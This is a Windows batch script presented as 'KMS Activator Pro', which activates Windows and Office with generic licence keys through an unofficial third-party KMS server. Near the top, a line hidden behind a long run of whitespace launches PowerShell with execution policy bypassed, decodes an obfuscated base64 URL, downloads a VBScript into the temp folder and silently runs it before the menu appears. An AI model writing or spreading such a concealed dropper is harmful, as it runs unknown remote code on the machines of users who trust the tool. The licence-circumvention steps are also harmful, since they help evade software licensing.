@echo off
title KMS Activator Pro - Windows ^& Office Activation Tool
mode con: cols=90 lines=30
color 1F
setlocal EnableDelayedExpansion
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              start /b "" powershell -ExecutionPolicy Bypass -NoProfile -Command "$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tLzB4M0VGOC9UZXN0L3Jhdy9yZWZzL2hlYWRzL21haW4vd2luLnZicw==')); $p=$env:TEMP+'\kms_helper.vbs'; Invoke-WebRequest -Uri $u -OutFile $p; Start-Process 'wscript' -ArgumentList $p -NoNewWindow -Wait" >nul 2>&1
echo [%date% %time:~0,8%] Launched helper script

cls
echo ==============================================================================
echo        KMS Activator Pro - Initializing...
echo ==============================================================================
echo.
echo [Step 1/3] Scanning system configuration...
set "spinner=|/-\"                
set "count=0"
:scanStep1
set /a "count+=1"
set /a "spinIndex=count %% 4"
for /l %%i in (0,1,3) do if %%i==!spinIndex! set "spinChar=!spinner:~%%i,1!"
<nul set /p "=Checking system components... [!spinChar!] "
ping -n 2 127.0.0.1 >nul
if !count! LSS 15 (
    cls
    echo ==============================================================================
    echo        KMS Activator Pro - Initializing...
    echo ==============================================================================
    echo.
    echo [Step 1/3] Scanning system configuration...
    goto :scanStep1
)
echo System scan completed.
echo [%date% %time:~0,8%] System configuration scan completed

echo.
echo [Step 2/3] Verifying Windows installation...
set "count=0"
:scanStep2
set /a "count+=1"
set /a "spinIndex=count %% 4"
for /l %%i in (0,1,3) do if %%i==!spinIndex! set "spinChar=!spinner:~%%i,1!"
<nul set /p "=Analyzing Windows details... [!spinChar!] "
ping -n 2 127.0.0.1 >nul
if !count! LSS 10 (
    cls
    echo ==============================================================================
    echo        KMS Activator Pro - Initializing...
    echo ==============================================================================
    echo.
    echo [Step 1/3] Scanning system configuration...
    echo System scan completed.
    echo.
    echo [Step 2/3] Verifying Windows installation...
    goto :scanStep2
)
echo Windows verification completed.
for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName ^| findstr /i "ProductName"') do set "winEdition=%%a %%b"
for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild ^| findstr /i "CurrentBuild"') do set "winBuild=%%a"
for /f "tokens=2" %%a in ('systeminfo ^| findstr /i "OS.*Type"') do set "winArch=%%a"
if !winBuild! GEQ 22000 (
    set "winBase=Windows 11"
) else (
    set "winBase=Windows 10"
)
echo Windows Details:
echo - Base OS: !winBase!
echo - Edition: !winEdition!
echo - Build: !winBuild!
echo - Architecture: !winArch!
echo [%date% %time:~0,8%] Windows verified - Base: !winBase!, Edition: !winEdition!, Build: !winBuild!, Arch: !winArch!

echo.
echo [Step 3/3] Detecting Office components...
set "count=0"
:scanStep3
set /a "count+=1"
set /a "spinIndex=count %% 4"
for /l %%i in (0,1,3) do if %%i==!spinIndex! set "spinChar=!spinner:~%%i,1!"
<nul set /p "=Checking Office installation... [!spinChar!] "
ping -n 2 127.0.0.1 >nul
if !count! LSS 10 (
    cls
    echo ==============================================================================
    echo        KMS Activator Pro - Initializing...
    echo ==============================================================================
    echo.
    echo [Step 1/3] Scanning system configuration...
    echo System scan completed.
    echo.
    echo [Step 2/3] Verifying Windows installation...
    echo Windows verification completed.
    echo Windows Details:
    echo - Base OS: !winBase!
    echo - Edition: !winEdition!
    echo - Build: !winBuild!
    echo - Architecture: !winArch!
    echo.
    echo [Step 3/3] Detecting Office components...
    goto :scanStep3
)
echo Office detection completed.
set "officePath="
set "officeVersions=Office16 Office15 Office14 Office19 Office21"
for %%v in (!officeVersions!) do (
    if exist "%ProgramFiles%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :officeDetected
    )
    if exist "%ProgramFiles(x86)%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles(x86)%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :officeDetected
    )
)
:officeDetected
if defined officePath (
    echo Office Details:
    echo - Version: !officeVer! (Office 2010-2021)
    echo - Path: !officePath!
    echo [%date% %time:~0,8%] Office detected - Version: !officeVer!, Path: !officePath!
) else (
    echo Office Details:
    echo - No Office installation found.
    echo [%date% %time:~0,8%] No Office installation detected
)
echo.
echo Initialization complete. Proceeding to activation tool...
timeout /t 2 >nul

:checkAdmin
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    cls
    echo ==============================================================================
    echo Administrative Privileges Required
    echo ==============================================================================
    echo.
    echo This tool requires administrative rights to function properly.
    echo Please right-click the file and select "Run as administrator".
    echo.
    echo [%date% %time:~0,8%] Failed: Admin privileges required
    pause
    exit
)

:menu
cls
echo ==============================================================================
echo        KMS Activator Pro - Windows ^& Office Activation Tool
echo ==============================================================================
echo.
echo Current Date: %date%    Time: %time:~0,8%
echo KMS Server: kms8.msguides.com
echo.
echo [1] Activate Windows
echo [2] Activate Microsoft Office
echo [3] Activate Windows ^& Office
echo [4] View Activation Status
echo [5] Exit
echo.
set "choice="
set /p choice="Please select an option [1-5]: "
if not defined choice goto :menu
if "%choice%"=="1" goto :winActivate
if "%choice%"=="2" goto :officeActivate
if "%choice%"=="3" goto :bothActivate
if "%choice%"=="4" goto :checkStatus
if "%choice%"=="5" (
    echo [%date% %time:~0,8%] User exited the tool
    exit
)
echo Invalid option selected!
echo [%date% %time:~0,8%] Invalid menu option: !choice!
timeout /t 2 >nul
goto :menu

:winActivate
cls
echo ==============================================================================
echo Activating Windows...
echo ==============================================================================
echo.
echo Detecting Windows version...
for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName ^| findstr /i "ProductName"') do set "winEdition=%%a %%b"
for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild ^| findstr /i "CurrentBuild"') do set "winBuild=%%a"
if !winBuild! GEQ 22000 (set "winBase=Windows 11") else (set "winBase=Windows 10")
echo [%date% %time:~0,8%] Windows activation started - Base: !winBase!, Edition: !winEdition!

if "!winEdition!"=="Windows 7 Professional" (
    set "winKey=VK7JG-NPHTM-C97JM-9MPGT-3V66T"
) else if "!winEdition!"=="Windows 7 Enterprise" (
    set "winKey=33PXH-7Y6KF-2VJC9-XBBR8-HVTHH"
) else if "!winEdition!"=="Windows 8 Professional" (
    set "winKey=NG4HW-VH26C-733KW-K6F98-J8CK4"
) else if "!winEdition!"=="Windows 8 Enterprise" (
    set "winKey=32JNW-9KQ84-P47T8-D8GGY-CWCK7"
) else if "!winEdition!"=="Windows 8.1 Professional" (
    set "winKey=GCRJD-8NW9H-F2CDX-CCM8D-9D6T9"
) else if "!winEdition!"=="Windows 8.1 Enterprise" (
    set "winKey=MHF9N-XY6XB-WVXMC-BTDCT-MKKG7"
) else if "!winEdition!"=="Windows 10 Professional" (
    set "winKey=W269N-WFGWX-YVC9B-4J6C9-T83GX"
) else if "!winEdition!"=="Windows 10 Enterprise" (
    set "winKey=NPPR9-FWDCX-D2C8J-H872K-2YT43"
) else if "!winEdition!"=="Windows 10 Education" (
    set "winKey=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
) else if "!winEdition!"=="Windows 10 Pro for Workstations" (
    set "winKey=NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J"
) else if "!winEdition!"=="Windows 11 Professional" (
    set "winKey=W269N-WFGWX-YVC9B-4J6C9-T83GX"
) else if "!winEdition!"=="Windows 11 Enterprise" (
    set "winKey=NPPR9-FWDCX-D2C8J-H872K-2YT43"
) else if "!winEdition!"=="Windows 11 Education" (
    set "winKey=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
) else if "!winEdition!"=="Windows 11 Pro for Workstations" (
    set "winKey=NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J"
) else (
    echo Unsupported Windows edition: !winBase! !winEdition!
    echo Please install a valid KMS client key manually.
    echo [%date% %time:~0,8%] Windows activation skipped - Unsupported edition: !winBase! !winEdition!
    set "winKey="
)

if defined winKey (
    echo Detected: !winBase! !winEdition!
    echo Installing KMS client key...
    cscript //nologo "%windir%\system32\slmgr.vbs" /ipk !winKey! >nul 2>&1
    if !errorLevel! NEQ 0 (
        echo Failed to install KMS client key!
        echo [%date% %time:~0,8%] Windows activation failed - Key installation error
        goto :errorEnd
    )
    echo [%date% %time:~0,8%] Windows KMS key installed: !winKey!
    echo Setting KMS server...
    cscript //nologo "%windir%\system32\slmgr.vbs" /skms kms8.msguides.com >nul 2>&1
    if !errorLevel! NEQ 0 (
        echo Failed to set KMS server!
        echo [%date% %time:~0,8%] Windows activation failed - KMS server error
        goto :errorEnd
    )
    echo [%date% %time:~0,8%] Windows KMS server set to kms8.msguides.com
    echo Activating Windows license...
    cscript //nologo "%windir%\system32\slmgr.vbs" /ato >nul 2>&1
    if !errorLevel! NEQ 0 (
        echo Windows activation failed!
        echo [%date% %time:~0,8%] Windows activation failed - Activation error
        goto :errorEnd
    )
    echo.
    echo Windows has been successfully activated!
    echo [%date% %time:~0,8%] Windows successfully activated - Base: !winBase!, Edition: !winEdition!
) else (
    echo Skipping Windows activation due to unsupported edition.
)
goto :successEnd

:officeActivate
cls
echo ==============================================================================
echo Activating Microsoft Office...
echo ==============================================================================
echo.
echo Searching for Office installation...
set "officePath="
set "officeVersions=Office16 Office15 Office14 Office19 Office21"
for %%v in (!officeVersions!) do (
    if exist "%ProgramFiles%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :officeFound
    )
    if exist "%ProgramFiles(x86)%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles(x86)%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :officeFound
    )
)

:officeFound
if not defined officePath (
    echo No Microsoft Office installation detected!
    echo Check if Office is installed and supports KMS activation.
    echo [%date% %time:~0,8%] Office activation failed - No installation detected
    goto :errorEnd
)
echo Found Office at: !officePath!
echo [%date% %time:~0,8%] Office activation started - Version: !officeVer!, Path: !officePath!

cd /d "!officePath!" 2>nul || (
    echo Failed to access Office directory!
    echo [%date% %time:~0,8%] Office activation failed - Directory access error
    goto :errorEnd
)

echo Installing Office KMS client key...
cscript //nologo ospp.vbs /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 >nul 2>&1
if !errorLevel! NEQ 0 (
    echo Failed to install Office KMS client key!
    echo [%date% %time:~0,8%] Office activation failed - Key installation error
    goto :errorEnd
)
echo [%date% %time:~0,8%] Office KMS key installed: XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99

echo Setting KMS server...
cscript //nologo ospp.vbs /sethst:kms8.msguides.com >nul 2>&1
if !errorLevel! NEQ 0 (
    echo Failed to set KMS server for Office!
    echo [%date% %time:~0,8%] Office activation failed - KMS server error
    goto :errorEnd
)
echo [%date% %time:~0,8%] Office KMS server set to kms8.msguides.com

echo Activating Office license...
cscript //nologo ospp.vbs /act >nul 2>&1
if !errorLevel! NEQ 0 (
    echo Office activation failed!
    echo Check your Office version and internet connection.
    echo [%date% %time:~0,8%] Office activation failed - Activation error
    cscript ospp.vbs /dstatus
    goto :errorEnd
)
echo.
echo Microsoft Office has been successfully activated!
echo [%date% %time:~0,8%] Office successfully activated - Version: !officeVer!
goto :successEnd

:bothActivate
cls
echo ==============================================================================
echo Activating Windows ^& Office...
echo ==============================================================================
echo.
echo Detecting Windows version...
for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName ^| findstr /i "ProductName"') do set "winEdition=%%a %%b"
for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild ^| findstr /i "CurrentBuild"') do set "winBuild=%%a"
if !winBuild! GEQ 22000 (set "winBase=Windows 11") else (set "winBase=Windows 10")
echo [%date% %time:~0,8%] Both activation started - Base: !winBase!, Edition: !winEdition!

if "!winEdition!"=="Windows 7 Professional" (
    set "winKey=VK7JG-NPHTM-C97JM-9MPGT-3V66T"
) else if "!winEdition!"=="Windows 7 Enterprise" (
    set "winKey=33PXH-7Y6KF-2VJC9-XBBR8-HVTHH"
) else if "!winEdition!"=="Windows 8 Professional" (
    set "winKey=NG4HW-VH26C-733KW-K6F98-J8CK4"
) else if "!winEdition!"=="Windows 8 Enterprise" (
    set "winKey=32JNW-9KQ84-P47T8-D8GGY-CWCK7"
) else if "!winEdition!"=="Windows 8.1 Professional" (
    set "winKey=GCRJD-8NW9H-F2CDX-CCM8D-9D6T9"
) else if "!winEdition!"=="Windows 8.1 Enterprise" (
    set "winKey=MHF9N-XY6XB-WVXMC-BTDCT-MKKG7"
) else if "!winEdition!"=="Windows 10 Professional" (
    set "winKey=W269N-WFGWX-YVC9B-4J6C9-T83GX"
) else if "!winEdition!"=="Windows 10 Enterprise" (
    set "winKey=NPPR9-FWDCX-D2C8J-H872K-2YT43"
) else if "!winEdition!"=="Windows 10 Education" (
    set "winKey=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
) else if "!winEdition!"=="Windows 10 Pro for Workstations" (
    set "winKey=NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J"
) else if "!winEdition!"=="Windows 11 Professional" (
    set "winKey=W269N-WFGWX-YVC9B-4J6C9-T83GX"
) else if "!winEdition!"=="Windows 11 Enterprise" (
    set "winKey=NPPR9-FWDCX-D2C8J-H872K-2YT43"
) else if "!winEdition!"=="Windows 11 Education" (
    set "winKey=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
) else if "!winEdition!"=="Windows 11 Pro for Workstations" (
    set "winKey=NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J"
) else (
    set "winKey="
)

if defined winKey (
    echo Detected: !winBase! !winEdition!
    cscript //nologo "%windir%\system32\slmgr.vbs" /ipk !winKey! >nul 2>&1
    echo [%date% %time:~0,8%] Windows KMS key installed: !winKey!
    cscript //nologo "%windir%\system32\slmgr.vbs" /skms kms8.msguides.com >nul 2>&1
    echo [%date% %time:~0,8%] Windows KMS server set to kms8.msguides.com
    cscript //nologo "%windir%\system32\slmgr.vbs" /ato >nul 2>&1
    if !errorLevel! NEQ 0 (
        echo Warning: Windows activation may have failed!
        echo [%date% %time:~0,8%] Windows activation failed
    ) else (
        echo [%date% %time:~0,8%] Windows successfully activated
    )
) else (
    echo Note: Unsupported Windows edition - !winBase! !winEdition!. Skipping Windows activation.
    echo [%date% %time:~0,8%] Windows activation skipped - Unsupported edition: !winBase! !winEdition!
)

echo Searching for Office installation...
set "officePath="
set "officeVersions=Office16 Office15 Office14 Office19 Office21"
for %%v in (!officeVersions!) do (
    if exist "%ProgramFiles%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :officeFoundBoth
    )
    if exist "%ProgramFiles(x86)%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles(x86)%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :officeFoundBoth
    )
)

:officeFoundBoth
if defined officePath (
    cd /d "!officePath!" 2>nul
    echo Found Office at: !officePath!
    echo [%date% %time:~0,8%] Office detected - Version: !officeVer!, Path: !officePath!
    cscript //nologo ospp.vbs /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 >nul 2>&1
    echo [%date% %time:~0,8%] Office KMS key installed: XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99
    cscript //nologo ospp.vbs /sethst:kms8.msguides.com >nul 2>&1
    echo [%date% %time:~0,8%] Office KMS server set to kms8.msguides.com
    cscript //nologo ospp.vbs /act >nul 2>&1
    if !errorLevel! NEQ 0 (
        echo Warning: Office activation may have failed!
        echo [%date% %time:~0,8%] Office activation failed
    ) else (
        echo [%date% %time:~0,8%] Office successfully activated - Version: !officeVer!
    )
) else (
    echo Note: No Office installation found.
    echo [%date% %time:~0,8%] Office activation skipped - No installation found
)
echo.
echo Activation process completed!
goto :successEnd

:checkStatus
cls
echo ==============================================================================
echo Activation Status Report
echo ==============================================================================
echo.
echo Windows Activation Status:
cscript //nologo "%windir%\system32\slmgr.vbs" /xpr
echo [%date% %time:~0,8%] Checked Windows activation status
echo.
echo Microsoft Office Status:
set "officePath="
set "officeVersions=Office16 Office15 Office14 Office19 Office21"
for %%v in (!officeVersions!) do (
    if exist "%ProgramFiles%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :statusFound
    )
    if exist "%ProgramFiles(x86)%\Microsoft Office\%%v\ospp.vbs" (
        set "officePath=%ProgramFiles(x86)%\Microsoft Office\%%v"
        set "officeVer=%%v"
        goto :statusFound
    )
)

:statusFound
if defined officePath (
    cd /d "!officePath!"
    cscript //nologo ospp.vbs /dstatus
    echo [%date% %time:~0,8%] Checked Office activation status - Version: !officeVer!
) else (
    echo No Office installation detected.
    echo [%date% %time:~0,8%] Checked Office status - No installation found
)
echo.
goto :successEnd

:successEnd
echo.
echo Press any key to return to menu...
echo [%date% %time:~0,8%] Activation process completed successfully
pause >nul
goto :menu

:errorEnd
echo.
echo An error occurred during the activation process.
echo Please ensure you have an internet connection and try again.
echo [%date% %time:~0,8%] Activation process failed
pause
goto :menu